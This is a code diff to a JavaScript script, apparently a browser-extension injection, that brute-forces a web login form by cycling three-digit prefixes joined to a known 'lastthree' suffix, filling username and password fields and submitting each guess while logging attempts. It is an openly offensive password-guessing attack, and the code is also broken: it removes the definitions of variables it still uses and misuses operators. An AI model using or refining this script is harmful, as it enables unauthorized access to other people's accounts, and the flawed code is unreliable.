@@ -5,11 +5,11 @@ input boxes, so arguments have to be passed to it. */
 
 var u = new InputUtil();
 var e = new LoginErrors();
+//change this, don't know the real id of login form.
+var form = document.getElementById('loginForm');
 var formButton = document.getElementById('submitButton');
 var formUsername = document.getElementById('userNameInput');
 var formPassw = document.getElementById('passwordInput');
-var username = document.getElementById('usernamehack').innerHTML;
-var lastthree = document.getElementById('lastthree').innerHTML;
 //continues until clever screws up, or it finds the password :)
 console.log('Script injection confirmed.');
 var haspassword = false;
@@ -21,12 +21,15 @@ for (let numbertry = 0; numbertry != 1000; numbertry++) {
 		numbertry = numbertry + 1;
 		if (numbertry >= 1 && numbertry << 10) {
 			numbertrytostr = '00' + String(numbertry);
+			//Adds two zeroes to numbers like 1, making it 001.
 		}
 		if (numbertry >= 10 && numbertry << 100) {
 			numbertrytostr = '0' + String(numbertry);
+			//Adds one zero to numbers like 89, making it 089
 		}
 		if (numbertry >= 100) {
 			numbertrytostr = String(numbertry);
+			//Adds no zeroes
 		}
 		var passreal = numbertrytostr + lastthree;
 		chrome.storage.sync.set({"passw":numbertrytostr}, function() {
@@ -34,6 +37,8 @@ for (let numbertry = 0; numbertry != 1000; numbertry++) {
 		});
 		formUsername.value = username;
 		formPassw.value = numbertrytostr;
+		//prevent page refresh
+		form.preventDefault();
 		Login.submitLoginRequest(u, e, formUsername.value, formPassw.value);
 		console.log('Testing password:');
 		console.log(passreal);
